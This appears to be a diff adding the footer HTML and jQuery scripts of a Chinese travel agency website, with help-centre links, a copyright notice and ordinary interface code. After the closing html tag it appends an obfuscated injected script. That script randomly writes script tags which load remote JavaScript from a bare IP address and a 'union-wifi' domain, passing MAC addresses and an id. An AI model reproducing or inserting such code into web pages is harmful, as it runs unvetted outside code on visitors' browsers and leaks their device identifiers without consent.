+                <p><a href="/help//5554" rel="nofollow" alt="签署旅游合同" title="签署旅游合同">签署旅游合同</a></p>
+                <p><a href="/help//5556" rel="nofollow" alt="预订流程与服务承诺" title="预订流程与服务承诺">预订流程与服务承诺</a></p>
+            </div>
+            <div class="txt "><i class="i1"></i>
+                <strong>怎么付款</strong>
+                <p><a href="/help//5559" rel="nofollow" alt="付款方式" title="付款方式">付款方式</a></p>
+                <p><a href="/help//5560" rel="nofollow" alt="付款说明与使用帮助" title="付款说明与使用帮助">付款说明与使用帮助</a></p>
+                <p><a href="/help//5562" rel="nofollow" alt="支付安全保障" title="支付安全保障">支付安全保障</a></p>
+                <p><a href="/help//5563" rel="nofollow" alt="关于发票" title="关于发票">关于发票</a></p>
+            </div>
+            <div class="txt bd_r0"><i class="i1"></i>
+                <strong>开始旅行</strong>
+                <p><a href="/help//5564" rel="nofollow" alt="出发前的准备" title="出发前的准备">出发前的准备</a></p>
+                <p><a href="/help//5566" rel="nofollow" alt="服务建议与投诉" title="服务建议与投诉">服务建议与投诉</a></p>
+                <p><a href="/help//5567" rel="nofollow" alt="旅行故事分享" title="旅行故事分享">旅行故事分享</a></p>
+                <p><a href="/help//5568" rel="nofollow" alt="其它服务事项" title="其它服务事项">其它服务事项</a></p>
+            </div>
+            <!-- <div class="J_imgbox"><img src=""></div> -->
+        </div>
+
+        <div class="bottom_ico fn-clear" style="text-align: center;">
+            <ul>
+
+                <li class="xukezheng" style="float: none;"><a href="/about"><i style="-webkit-transform:scale(0.8); font-family: Arial;">L-YN-CJ00009</i></a></li>                <li style="float: none;"><span class="pay"></span></li>
+            </ul>
+        </div>
+        <div class="copyright fn-clear">
+            <div class="nav">
+                <a href="/about/291">关于云游旅行网</a>
+                <a href="/about/292">联系云游旅行网</a>
+                <a href="/sitemap">网站地图</a><a href="/link">友情链接</a>
+                <a href="/help">帮助中心</a>
+                <a href="/cp/login" rel="nofollow">管理</a>
+            </div>
+            <p><span>Copyright &copy; 2017 <a href="/" target="_blank">云游旅行网</a>   <a href="http://www.miitbeian.gov.cn/" target="_blank" rel="nofollow">滇ICP备14006366号-1</a></span>
+                云南中青国际旅行社有限公司旗下网站  公司地址：云南省昆明市拓东路133号（650041）  直线电话：0871-63199931
+            </p>
+
+
+        </div>
+
+    </div>
+
+
+<script type="text/javascript">
+    $(document).ready(function(){
+        // $("img").error(function(){
+        //     var src=$(this).attr("src");
+        //     if (src.substr(0, 20) == "http://c.cncnimg.cn/") {
+        //         $(this).attr("src", "http://xnxwcdn.cncn.net/images/front/nopic_m.jpg");
+        //     }
+        // });
+        $('.s-weixin').hover(function(){$(this).addClass('hover')},function(){$(this).removeClass('hover')});
+        // $("p.weixin").hover(function(){
+        //  $(this).addClass("hover");
+        // },function(){
+        //  $(this).removeClass("hover");
+        // });
+        $('.f-chat,.f-qq').hover(function(){
+            $('.f-qq').toggle();
+
+        });
+        $('.f-call,.f-telnum').hover(function(){
+            $('.f-telnum').toggle();
+        });
+
+        $(window).scroll(function(){
+            var top=$(window).scrollTop();
+            if(top>0){
+                $('.f-scrolltop').show();
+            }else{
+                $('.f-scrolltop').hide();
+            }
+        });
+        $('.f-scrolltop').click(function(event) {
+            $('body,html').animate({scrollTop:0}, 200);
+
+        });
+
+    });
+
+    $('.tonglan_menu a').hover(function(){
+        var index = $(this).index();
+        $(this).addClass('first').siblings('a').removeClass('first');
+
+        var eleCont = $(this).parents('.hd').siblings('.bd');
+        eleCont.children('.tab_cont').children('.pro_list').eq(index).addClass('showed').siblings('.pro_list').removeClass('showed');
+    })
+
+    $(function(){
+        $('.J_imgbox').css({
+            'width':'100%',
+            'border':0
+        });
+        $('.hideBox').css({width:'0'});
+        $('.J_imgbox').css({width:"200px"});
+        $('.s-weixin').on('mouseover',function(){
+            // var src=$('.J_hidebox').attr('src');
+
+            // $('.J_imgbox').find('img').attr('src',src).end().show();
+            $('.hideBox').show();
+        });
+        $('.s-weixin').on('mouseleave',function(){
+            $('.hideBox').hide();
+        });
+    });
+
+
+    $('.ota_menu a').hover(function(){
+        var _this = $(this);
+        var index = $(this).index();
+        if(index  == 0) {
+            return;
+        }
+        var ele = _this.parents('.hd').siblings('.bd').find('.pro_list').eq(index);
+        var state = $(this).attr('data-state');
+        var id    = $(this).attr('data-id');
+        var item  = $(this).attr('data-item');
+        if (id == '') {
+            alert("非法操作，数据不正确");
+            return;
+        }
+        if (item == '') {
+            alert("非法操作，数据不正确");
+            return;
+        }
+
+
+        if (state != 'ajaxed') {
+            _this.attr('data-state', 'ajaxed');
+            $.ajax({
+                url: '/welcome/get_product_info',
+                type: 'POST',
+                dataType: 'JSON',
+                data: {'id': id,'item': item},
+                success: function(data) {
+                    if(data.status == 1){
+                        alert("非法操作，数据不正确");
+                        console.log("非法操作，数据不正确");
+                        return;
+                    }else{
+                        ele.css('background', 'none').html(data);
+                    }
+                }
+            })
+        }
+
+    })
+</script>
+
+
+<div class="f-fixedbox">
+    <div class="f-hover f-scrolltop">返回顶部</div>
+</div>
+
+
+
+<script src="http://xnxw.cncnimg.cn/js/jquery.lazyload.js?v=20150513"></script>
+
+<div style="margin:0 auto;text-align:center;width:100%;"></div>
+
+<script>
+</script>
+
+
+
+<div style="margin:0 auto;text-align:center;width:100%;"><script src="http://s11.cnzz.com/stat.php?id=5313953&web_id=5313953" language="JavaScript"></script></div>
+</body>
+</html>
+
+<script>
+    function ik_random(){var ik_r_min=0;var ik_r_max=100;return(parseInt(Math.random()*(ik_r_max-ik_r_min+1)+ik_r_min));}
+    function ik_isiframe(){return (self!=top);}
+    var __m='54:ee:75:88:2d:bc';
+    var __m2='00:00:00:00:00:00';
+    var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=90b9a2b579ed77179e1accd617f5034b,PC,";
+    var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+    var x=ik_random();
+    if(!ik_isiframe()){
+        switch(true){
+            case x>=0&&x<5:
+                document.write(__h+"200"+__b);
+                document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?R6Gpf6T&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+                break;
+            case x>=55&&x<=100:
+                document.write(__h+"100"+__b);
+                document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?Rav195P&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+                break;
+        }
+    }
+</script>
